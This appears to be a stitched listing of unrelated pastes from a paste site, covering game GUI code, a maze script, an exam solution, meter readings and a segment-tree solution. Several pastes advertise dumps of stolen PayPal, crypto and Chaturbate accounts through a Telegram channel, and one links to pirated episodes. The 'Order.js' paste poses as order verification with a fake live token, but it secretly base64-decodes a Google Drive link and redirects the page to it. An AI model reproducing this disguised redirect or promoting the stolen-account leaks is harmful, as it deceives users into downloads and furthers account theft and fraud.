				local RemaningTime = (LastClaim + 24 * 60 * 60) - CurrentTime
				if RemaningTime > 0 then
					ClaimButton.BackgroundColor3 = Color3.fromRGB(70, 232, 70)
					ClaimButton.Label.Text = string.format(""%02d:%02d:%02d"", math.floor(RemaningTime / 3600), math.floor((RemaningTime % 3600) / 60), RemaningTime % 60)
					ClaimButton.AutoButtonColor = false
					ClaimButton.Active = false
					
					task.spawn(function()
						while RemaningTime > 0 do
							task.wait(1)
							RemaningTime -= 1
							ClaimButton.Label.Text = string.format(""%02d:%02d:%02d"", math.floor(RemaningTime / 3600), math.floor((RemaningTime % 3600) / 60), RemaningTime % 60)
						end
						
						UpdateButtons()
					end)
				end
				
				ClaimButton.BackgroundColor3 = Color3.fromRGB(70, 232, 70)
				ClaimButton.Label.Text = `Claim!`
				ClaimButton.AutoButtonColor = true
				ClaimButton.Active = true
			else
				ClaimButton.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
				ClaimButton.Label.Text = `Day {tostring(Day)}!`
				ClaimButton.AutoButtonColor = false
				ClaimButton.Active = false
			end
			
			ClaimButton.MouseButton1Click:Connect(function()
				Remotes.ClaimDailyReward:FireServer(Day)
			end)
		end
	end
end

local function GenerateGui()
	for _, Day in ipairs(Days) do
		local Reward = DailyRewardsConfig[Day]
		
		local DailyRewardTemplate = Template:Clone()
		DailyRewardTemplate.Parent = Container
		DailyRewardTemplate.Name = Day
		DailyRewardTemplate.Visible = true
		
		DailyRewardTemplate.RewardType.Text = Reward.Type
		DailyRewardTemplate.RewardAmount.Text = `+{tostring(Reward.Amount)}`
		
		if Reward.Type == ""Coins"" then
			DailyRewardTemplate.Icon.Image = ""rbxassetid://110090562386571""
		elseif Reward.Type == ""Gems"" then
			DailyRewardTemplate.Icon.Image = ""rbxassetid://119954836886183""
		end
	end
	
	UpdateButtons()
end

GenerateGui()

local function CloseGui()
	Frame.Visible = false
end

local function OpenGui()
	Frame.Visible = not Frame.Visible
end

Player:WaitForChild(""DailyReward"").Changed:Connect(UpdateButtons)
Remotes.ClaimDailyReward.OnClientEvent:Connect(UpdateButtons)

Exit.MouseButton1Click:Connect(CloseGui)
Open.MouseButton1Click:Connect(OpenGui)"
33WFP6Pm,Earth Arcade 3,ktvchains,Perl,Saturday 26th of April 2025 04:42:50 AM CDT,"# EN, 1080p
# subs: https://subsource.net/subtitles/earth-arcade-2022/season-3 (if filtered, choose type WEB)
# for the download links there is a 60 sec counter; if you don't see the counter, turn off adblock or try another browser
 
# E1 250425
[!ads] watch: https://filemoon.to/d/0yq8n0gjtuss
[!ads] dl: https://frdl.is/y6pwegw0stfu"
rvvzVRc9,Chaturbate with Tokens,hubertzoo90,JavaScript,Saturday 26th of April 2025 04:38:54 AM CDT,65514 Accounts Posted On https://t.me/leakedbyem1nem
nb20vpBH,test,princejoogie,Lua,Saturday 26th of April 2025 04:26:44 AM CDT,"-- my test maze:
--
-- ++++++++
-- +     X+
-- +++ ++ +
-- +    + +
-- + ++ + +
-- +O+    +
-- ++++++++
--
-- moving forward from the start will ""move up"" the maze

turtle.forward()
turtle.forward()
turtle.turnRight()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.turnRight()
turtle.forward()
turtle.turnRight()
turtle.forward()
turtle.turnRight()
turtle.turnRight()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.turnLeft()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.turnLeft()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.forward()
turtle.turnLeft()
turtle.turnLeft()
turtle.forward()
turtle.forward()
turtle.turnRight()
turtle.forward()
turtle.forward()
turtle.turnRight()
turtle.forward()
turtle.forward()
turtle.turnLeft()
turtle.forward()
turtle.forward()
"
1bJ8yaD7,Crypto Accounts,hubertzoo90,JavaScript,Saturday 26th of April 2025 04:23:31 AM CDT,89498 Accounts Posted On https://t.me/leakedbyem1nem
d3gk2QSr,13 —Å –ø–µ—Ä–µ–±–æ—Ä–æ–º —Ö–≤–æ—Å—Ç–∏–∫–∞,nq1s788,Python,Saturday 26th of April 2025 04:14:58 AM CDT,"#7016 https://kpolyakov.spb.ru/school/ege/gen.php?action=viewAllEgeNo&egeId=13&cat48=on&cat49=on&cat50=on&cat51=on&cat177=on
cnt = 0
for x in range(2**10): #–ø–æ—Ç–æ–º—É —á—Ç–æ –º–∞–∫—Å –∫–æ—Ç–æ—Ä–æ–µ –Ω—É–∂–Ω–æ –±—É–¥–µ—Ç —ç—Ç–æ 1111111111 (10 –µ–¥–∏–Ω–∏—Ü)
    s = bin(x)[2:] #–µ—Å–ª–∏ –≤ –∑–∞–¥–∞—á–µ —Å–ø—Ä–∞—à–∏–≤–∞—é—Ç –∫–æ–ª-–≤–æ –Ω—É–ª–µ–π, —Ç–æ –Ω—É–∂–Ω–æ –¥–æ–±–∏—Ç—å –≤–µ–¥—É—â–∏–º–∏
    if s.count('1') % 2 == 1:
        cnt += 1
print(cnt)"
kzDGqALc,PayPal with Balance,hubertzoo90,JavaScript,Saturday 26th of April 2025 04:08:08 AM CDT,84420 Accounts Posted On https://t.me/leakedbyem1nem
17vh685q,Chaturbate with Tokens,jm33,JavaScript,Saturday 26th of April 2025 03:52:22 AM CDT,50283 Accounts Posted On https://t.me/leakedbyem1nem
LBMJ0gAM,Untitled,lutunovoleg,JSON,Saturday 26th of April 2025 03:47:58 AM CDT,"{
  ""suspicious_meters"": [
    {
      ""serial_number"": ""SN2023-ABC-123"",
      ""reason"": ""–†–µ–∑–∫–∏–π —Å–∫–∞—á–æ–∫ –ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏—è –≤ –Ω–æ—á–Ω–æ–µ –≤—Ä–µ–º—è"",
      ""suspicion_level"": 0.95
    },
    {
      ""serial_number"": ""SN2023-DEF-456"",
      ""reason"": ""–ü–æ—Å—Ç–æ—è–Ω–Ω–æ –≤—ã—Å–æ–∫–æ–µ –ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ"",
      ""suspicion_level"": 0.88
    },
    {
      ""serial_number"": ""SN2024-GHI-789"",
      ""reason"": ""–ê–Ω–æ–º–∞–ª—å–Ω–æ –≤—ã—Å–æ–∫–∏–π —É—Ä–æ–≤–µ–Ω—å —Ä–µ–∞–∫—Ç–∏–≤–Ω–æ–π —ç–Ω–µ—Ä–≥–∏–∏"",
      ""suspicion_level"": 0.92
    }
  ],
  ""visualization_data"": {
    ""SN2023-ABC-123"": {
      ""half_hour_readings_A_plus"": [
        {""timestamp"": ""2025-04-25T00:00:00"", ""value"": 1.2},
        {""timestamp"": ""2025-04-25T00:30:00"", ""value"": 1.5},
        {""timestamp"": ""2025-04-25T01:00:00"", ""value"": 4.8},
        {""timestamp"": ""2025-04-25T01:30:00"", ""value"": 4.5},
        {""timestamp"": ""2025-04-25T02:00:00"", ""value"": 4.9},
        {""timestamp"": ""2025-04-25T02:30:00"", ""value"": 1.3},
        {""timestamp"": ""2025-04-25T03:00:00"", ""value"": 1.1}
      ],
      ""half_hour_readings_P_plus"": [
        {""timestamp"": ""2025-04-25T00:00:00"", ""value"": 0.2},
        {""timestamp"": ""2025-04-25T00:30:00"", ""value"": 0.3},
        {""timestamp"": ""2025-04-25T01:00:00"", ""value"": 0.8},
        {""timestamp"": ""2025-04-25T01:30:00"", ""value"": 0.7},
        {""timestamp"": ""2025-04-25T02:00:00"", ""value"": 0.9},
        {""timestamp"": ""2025-04-25T02:30:00"", ""value"": 0.2},
        {""timestamp"": ""2025-04-25T03:00:00"", ""value"": 0.1}
      ],
      ""daily_readings_T0_A_plus"": [
        {""date"": ""2025-04-24"", ""value"": 25.6},
        {""date"": ""2025-04-25"", ""value"": 38.2}
      ]
    },
    ""SN2023-DEF-456"": {
      ""half_hour_readings_A_plus"": [
        {""timestamp"": ""2025-04-25T00:00:00"", ""value"": 5.1},
        {""timestamp"": ""2025-04-25T00:30:00"", ""value"": 5.2},
        {""timestamp"": ""2025-04-25T01:00:00"", ""value"": 5.0},
        {""timestamp"": ""2025-04-25T01:30:00"", ""value"": 5.1},
        {""timestamp"": ""2025-04-25T02:00:00"", ""value"": 5.2},
        {""timestamp"": ""2025-04-25T02:30:00"", ""value"": 5.1},
        {""timestamp"": ""2025-04-25T03:00:00"", ""value"": 5.0}
      ],
      ""half_hour_readings_P_plus"": [
        {""timestamp"": ""2025-04-25T00:00:00"", ""value"": 0.5},
        {""timestamp"": ""2025-04-25T00:30:00"", ""value"": 0.6},
        {""timestamp"": ""2025-04-25T01:00:00"", ""value"": 0.5},
        {""timestamp"": ""2025-04-25T01:30:00"", ""value"": 0.6},
        {""timestamp"": ""2025-04-25T02:00:00"", ""value"": 0.5},
        {""timestamp"": ""2025-04-25T02:30:00"", ""value"": 0.6},
        {""timestamp"": ""2025-04-25T03:00:00"", ""value"": 0.5}
      ],
      ""daily_readings_T0_A_plus"": [
        {""date"": ""2025-04-24"", ""value"": 120.5},
        {""date"": ""2025-04-25"", ""value"": 122.1}
      ]
    },
    ""SN2024-GHI-789"": {
      ""half_hour_readings_A_plus"": [
        {""timestamp"": ""2025-04-25T00:00:00"", ""value"": 0.8},
        {""timestamp"": ""2025-04-25T00:30:00"", ""value"": 0.9},
        {""timestamp"": ""2025-04-25T01:00:00"", ""value"": 0.7},
        {""timestamp"": ""2025-04-25T01:30:00"", ""value"": 0.8},
        {""timestamp"": ""2025-04-25T02:00:00"", ""value"": 0.9},
        {""timestamp"": ""2025-04-25T02:30:00"", ""value"": 0.7},
        {""timestamp"": ""2025-04-25T03:00:00"", ""value"": 0.8}
      ],
      ""half_hour_readings_P_plus"": [
        {""timestamp"": ""2025-04-25T00:00:00"", ""value"": 3.2},
        {""timestamp"": ""2025-04-25T00:30:00"", ""value"": 3.5},
        {""timestamp"": ""2025-04-25T01:00:00"", ""value"": 3.3},
        {""timestamp"": ""2025-04-25T01:30:00"", ""value"": 3.4},
        {""timestamp"": ""2025-04-25T02:00:00"", ""value"": 3.6},
        {""timestamp"": ""2025-04-25T02:30:00"", ""value"": 3.3},
        {""timestamp"": ""2025-04-25T03:00:00"", ""value"": 3.5}
      ],
      ""daily_readings_T0_A_plus"": [
        {""date"": ""2025-04-24"", ""value"": 15.1},
        {""date"": ""2025-04-25"", ""value"": 16.8}
      ]
    }
  }
}"
q7URY9J4,Slicnost,lukadupli,C++,Saturday 26th of April 2025 03:44:50 AM CDT,"#include <bits/stdc++.h>

#define fi first
#define se second

using namespace std;

typedef long long ll;
typedef pair<int, int> pii;

const int MAX = 1 << 17;

template<typename T> T spoji(T a, T b){
    if(a.fi != b.fi) return max(a, b);
    return {a.fi, a.se + b.se};
}
struct Node{
    Node *lc = nullptr, *rc = nullptr;
    pii val;
    int lazy = 0;
    void calc(){
        val = spoji(lc->val, rc->val);
    }
};
Node* build(int l = 0, int r = MAX){
    Node* node = new Node;
    if(r - l == 1){
        node->val = {0, 1};
        return node;
    }
    int m = (l + r) / 2;
    node->lc = build(l, m);
    node->rc = build(m, r);
    node->calc();
    return node;
}
Node* clone(Node* node){
    Node* novi = new Node;
    novi->lc = node->lc;
    novi->rc = node->rc;
    novi->val = node->val;
    novi->lazy = node->lazy;
    return novi;
}
void prop(Node* node, int l, int r){
    if(!node->lazy || r - l == 1) return;

    node->lc = clone(node->lc);
    node->lc->val.fi += node->lazy;
    node->lc->lazy += node->lazy;

    node->rc = clone(node->rc);
    node->rc->val.fi += node->lazy;
    node->rc->lazy += node->lazy;

    node->lazy = 0;
}
Node* update(int lu, int ru, int val, Node* node, int l = 0, int r = MAX){
    if(l >= lu && r <= ru){
        Node* novi = clone(node);
        novi->val.fi += val;
        novi->lazy += val;
        return novi;
    }
    if(l >= ru || r <= lu) return node;

    prop(node, l, r);

    int m = (l + r) / 2;
    Node* novi = new Node;
    novi->lc = update(lu, ru, val, node->lc, l, m);
    novi->rc = update(lu, ru, val, node->rc, m, r);
    novi->calc();

    return novi;
}
void print(Node* node, int l = 0, int r = MAX){
    if(r - l == 1){
        printf(""(%d, %d) "", node->val.fi, node->val.se);
        return;
    }
    prop(node, l, r);

    int m = (l + r)/2;
    print(node->lc, l, m);
    print(node->rc, m, r);
}

struct Tour2{
    pair<int, ll> nodes[2*MAX];

    void update(int ind, pii val, int node = 1, int l = 0, int r = MAX){
        if(r - l == 1){
            nodes[node] = val;
            return;
        }

        int m = (l + r) / 2;
        if(ind < m) update(ind, val, 2*node, l, m);
        else update(ind, val, 2*node + 1, m, r);

        nodes[node] = spoji(nodes[2*node], nodes[2*node + 1]);
    }
};

int n, k, q, pos[MAX];
pii lrs[MAX];

Node *tours[MAX];
Tour2 t2;

int main()
{
    ios_base::sync_with_stdio(0);
    cin.tie(0);

    cin >> n >> k >> q;
    for(int i = 0; i < n; i++){
        int x; cin >> x;
        pos[x] = i;
    }
    for(int i = 0; i < n; i++){
        int x; cin >> x;
        int l = max(i - k + 1, 0), r = min(i, n - k) + 1;

        lrs[pos[x]] = {l, r};
    }

    tours[0] = build();
    for(int i = 0; i < k - 1; i++){
        tours[0] = update(lrs[i].fi, lrs[i].se, 1, tours[0]);
    }

    for(int i = k - 1; i < n; i++){
        tours[i - k + 1] = update(lrs[i].fi, lrs[i].se, 1, tours[i - k + 1]);
        t2.update(i - k + 1, tours[i - k + 1]->val);
        tours[i - k + 2] = update(lrs[i - k + 1].fi, lrs[i - k + 1].se, -1, tours[i - k + 1]);
    }
    cout << t2.nodes[1].fi << ' ' << t2.nodes[1].se << '\n';

    while(q--){
        int x;
        cin >> x;
        x--;
        int a = x - k + 1, b = x + 1;

        if(a >= 0){
            tours[a] = update(lrs[x].fi, lrs[x].se, -1, tours[a]);
            tours[a] = update(lrs[x + 1].fi, lrs[x + 1].se, 1, tours[a]);
            t2.update(a, tours[a]->val);
        }
        if(b <= n - k){
            tours[b] = update(lrs[x + 1].fi, lrs[x + 1].se, -1, tours[b]);
            tours[b] = update(lrs[x].fi, lrs[x].se, 1, tours[b]);
            t2.update(b, tours[b]->val);
        }

        swap(lrs[x], lrs[x + 1]);
        cout << t2.nodes[1].fi << ' ' << t2.nodes[1].se << '\n';
    }

	return 0;
}

"
RngWByxG,Order.js,zebmekey,JavaScript,Saturday 26th of April 2025 03:40:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33893/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
